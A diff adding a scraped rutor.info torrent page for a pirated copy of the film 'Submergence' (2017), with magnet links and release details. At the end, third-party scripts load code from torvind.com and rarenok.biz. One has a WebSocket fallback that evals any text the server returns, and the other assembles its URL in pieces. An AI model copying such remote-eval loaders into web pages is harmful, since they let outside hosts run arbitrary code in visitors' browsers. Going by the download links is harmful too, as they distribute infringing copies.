@@ -1,0 +1,359 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Погружение / Submergence (2017) BDRip-AVC от HELLYWOOD | iTunes</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Погружение / Submergence (2017) BDRip-AVC от HELLYWOOD | iTunes</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:f579f25126ac1e53d66633c8cc86e7cd02283d09&amp;dn=rutor.info_%D0%9F%D0%BE%D0%B3%D1%80%D1%83%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5+%2F+Submergence+%282017%29+BDRip-AVC+%D0%BE%D1%82+HELLYWOOD+%7C+iTunes&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630518"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630518"><img src="http://s.rutor.info/t/down.png"> Скачать Pogruzheniye.2017.RUS.BDRip.x264.-HELLYWOOD.mkv.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://i104.fastpic.ru/big/2018/0508/b1/b19ed9de8b572beea8d045549a8692b1.png" style="float:right;" /><br />
+<span style="font-family:georgia;"><li><b>Год выпуска:</b> <span style="color:brown;"><b>2017</b></span><br />
+<li><b>Производство:</b> <span style="color:darkblue;"><b> Германия, США, Франция, Испания.</b></span><br />
+<li><b>Жанр:</b>  <a href="/tag/1/триллер" target="_blank">триллер</a>, <a href="/tag/1/драма" target="_blank">драма</a>, <a href="/tag/1/мелодрама" target="_blank">мелодрама</a><br />
+<li><b>Продолжительность:</b> 01:51:35<br />
+<li><b>Перевод:</b> Дубляж [iTunes]<br />
+<li><b>Субтитры:</b> русские <br />
+<li><b>Навигация по главам:</b> есть<br />
+<hr /><br />
+<li><b>Режиссер:</b>  Вим Вендерс / Wim Wenders<br />
+<li><b>В ролях:</b><br />
+<a href="http://www.kinopoisk.ru/name/1323290/" target="_blank"><img src="http://st.kinopoisk.ru/images/sm_actor/1323290.jpg" /></a> <a href="http://www.kinopoisk.ru/name/5530/" target="_blank"><img src="http://st.kinopoisk.ru/images/sm_actor/5530.jpg" /></a> <a href="http://www.kinopoisk.ru/name/10310/" target="_blank"><img src="http://st.kinopoisk.ru/images/sm_actor/10310.jpg" /></a> <a href="http://www.kinopoisk.ru/name/1515248/" target="_blank"><img src="http://st.kinopoisk.ru/images/sm_actor/1515248.jpg" /></a> <a href="http://www.kinopoisk.ru/name/1707827/" target="_blank"><img src="http://st.kinopoisk.ru/images/sm_actor/1707827.jpg" /></a> <a href="http://www.kinopoisk.ru/name/970964/" target="_blank"><img src="http://st.kinopoisk.ru/images/sm_actor/970964.jpg" /></a> <a href="http://www.kinopoisk.ru/name/2415379/" target="_blank"><img src="http://st.kinopoisk.ru/images/sm_actor/2415379.jpg" /></a> <a href="http://www.kinopoisk.ru/name/1723467/" target="_blank"><img src="http://st.kinopoisk.ru/images/sm_actor/1723467.jpg" /></a> <a href="http://www.kinopoisk.ru/name/1244547/" target="_blank"><img src="http://st.kinopoisk.ru/images/sm_actor/1244547.jpg" /></a> <a href="http://www.kinopoisk.ru/name/109947/" target="_blank"><img src="http://st.kinopoisk.ru/images/sm_actor/109947.jpg" /></a> <a href="http://www.kinopoisk.ru/name/1263257/" target="_blank"><img src="http://st.kinopoisk.ru/images/sm_actor/1263257.jpg" /></a> <a href="http://www.kinopoisk.ru/name/2298659/" target="_blank"><img src="http://st.kinopoisk.ru/images/sm_actor/2298659.jpg" /></a><br />
+Алисия Викандер <span style="color:gray;">(Danielle Flinders)</span>, Джеймс МакЭвой <span style="color:gray;">(James More)</span>, Александр Сиддиг <span style="color:gray;">(Dr. Shadid)</span>, Янник Шуманн <span style="color:gray;">(Paul)</span>, Реда Катеб <span style="color:gray;">(Saif)</span>, Селин Джонс <span style="color:gray;">(Thumbs)</span>, Мохамед Хакимшади <span style="color:gray;">(Yusef M-Al-Afghani)</span>, Джесс Лиодин <span style="color:gray;">(Marcel)</span>, Годехард Гизе <span style="color:gray;">(Wolfgang)</span>, Харви Фридман <span style="color:gray;">(Bob)</span>, Андреа Гваш <span style="color:gray;">(Maria)</span>, Алекс Хафнер <span style="color:gray;">(Mr. Bellhop)</span><br />
+<hr /><br />
+<li><b>О фильме:</b> <span style="color:blue;">Он - офицер разведки, она - ученый-океанолог. Ему предстояла смертельно опасная спецоперация в Сомали, ей - глубоководная экспедиция. И теперь, в минуту испытаний пред лицом смерти - в плену у боевиков, в батискафе на глубине океана - все, что у них есть, - это их любовь...</span><br />
+<hr /><br />
+<li><b>Бюджет:</b> $15 000 000<br />
+<hr /><br /> <a href="http://www.kinopoisk.ru/film/943779/" target="_blank"><img src="http://www.kinopoisk.ru/rating/943779.gif" /></a><a href="http://multi-up.com/1197601" target="_blank"><img src="http://s019.radikal.ru/i608/1309/f2/7e20dc87f0ae.png" /></a> <a href="http://hellywood.ru/" target="_blank"><img src="http://s018.radikal.ru/i509/1307/07/e8cb4fa7c900.jpg" /></a> <img src="http://i73.fastpic.ru/big/2016/0324/de/bbc9e9d07685078479d83aa7f8e923de.gif" /><br />
+<hr /><br />
+<li><b>Качество: <span style="color:darkblue;">BDRip-AVC</span></b><br />
+<li><b>Формат:</b> MKV<br />
+<li><b>Видео: </b>AVC, 912x492 (1.85:1), 1423 kbps, 24 fps<br />
+<li><b>Аудио: </b>русский / AC3 / 5.1 / 48 kHz / 384 kbps / 16 bit<br />
+<br />
+<br />
+<a href="https://imageban.ru/show/2018/05/08/04b772185316f3f68dc78a6a705235d2/png" target="_blank"><img src="http://i4.imageban.ru/thumbs/2018.05.08/04b772185316f3f68dc78a6a705235d2.png" /></a> <a href="https://imageban.ru/show/2018/05/08/174babe8aa1dffc2c7923a3c55a1732d/png" target="_blank"><img src="http://i5.imageban.ru/thumbs/2018.05.08/174babe8aa1dffc2c7923a3c55a1732d.png" /></a> <a href="https://imageban.ru/show/2018/05/08/e60e2d7e16eb70b585937af803515e60/png" target="_blank"><img src="http://i3.imageban.ru/thumbs/2018.05.08/e60e2d7e16eb70b585937af803515e60.png" /></a> <br />
+<a href="https://imageban.ru/show/2018/05/08/0e23a6cabf8fe6ef24b4b39497aefb63/png" target="_blank"><img src="http://i4.imageban.ru/thumbs/2018.05.08/0e23a6cabf8fe6ef24b4b39497aefb63.png" /></a> <a href="https://imageban.ru/show/2018/05/08/34ed027f1a549733a5d40e231f78d217/png" target="_blank"><img src="http://i4.imageban.ru/thumbs/2018.05.08/34ed027f1a549733a5d40e231f78d217.png" /></a> <a href="https://imageban.ru/show/2018/05/08/0e5778a76a5c326a645175bd681b3240/png" target="_blank"><img src="http://i4.imageban.ru/thumbs/2018.05.08/0e5778a76a5c326a645175bd681b3240.png" /></a></span></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/375436/0" target="_blank">potroks</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/kino" target="_blank">Зарубежные фильмы</a></td></tr>
+<tr><td class="header">Раздают</td><td>26</td></tr>
+<tr><td class="header">Качают</td><td>8</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (18 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 18:36:34  (14 часа назад)</td></tr>
+<tr><td class="header">Размер</td><td>1.41&nbsp;GB  (1509715917 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630518);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630417"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:a83dc240315ae20934af249692b8175058ad8944&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630417/pogruzhenie_submergence-2017-bdremux-1080p-ot-exkinoray-itunes">Погружение / Submergence (2017) BDRemux 1080p от ExKinoRay | iTunes </a></td> 
+<td align="right">19.21&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;31</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr><tr class="tum"><td>01&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/626044"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:0a7725ab3055ad4061d68489530f1a4be1fcb29c&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/626044/pogruzhenie_submergence-2017-hdrip-ot-scarabey-itunes">Погружение / Submergence (2017) HDRip от Scarabey | iTunes </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.40&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;33</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>01&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/629302"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:69be3c45e25e6a09f1fbcedb31def2450b55e8ea&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/629302/pogruzhenie_submergence-2017-hdrip-ot-megapeer-itunes">Погружение / Submergence (2017) HDRip от MegaPeer | iTunes </a></td> 
+<td align="right">751.18&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;10</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>29&nbsp;Апр&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/625804"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:31f37ae00b7bb05893c6b0c432c202576e0899f7&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/625804/pogruzhenie_submergence-2017-hdrip-ot-megapeer-itunes">Погружение / Submergence (2017) HDRip от MegaPeer | iTunes </a></td> <td align="right">13<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.40&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;79</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>29&nbsp;Апр&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/628847"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:81510981fd1f1dea801fcf3715a308652b96b6be&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/628847/pogruzhenie_submergence-2017-bdrip-1080p-ot-exkinoray-itunes">Погружение / Submergence (2017) BDRip 1080p от ExKinoRay | iTunes </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">8.86&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;98</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="tum"><td>28&nbsp;Апр&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/628816"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c2bc9e4463640205d6d7eb1a2e092065bad69e92&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/628816/pogruzhenie_submergence-2017-bdrip-720p-ot-exkinoray-itunes">Погружение / Submergence (2017) BDRip 720p от ExKinoRay | iTunes </a></td> <td align="right">3<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">5.76&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;55</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr><tr class="gai"><td>28&nbsp;Апр&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/628767"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:6375ecab9f66fec4feb08843162d1846aee8f8cf&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/628767/pogruzhenie_submergence-2017-web-dlrip-avc-itunes">Погружение / Submergence (2017) WEB-DLRip-AVC | iTunes </a></td> 
+<td align="right">745.81&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;11</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/1/0/0/Погружение" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630518.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (1)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630518">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630518);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630518);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630518">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
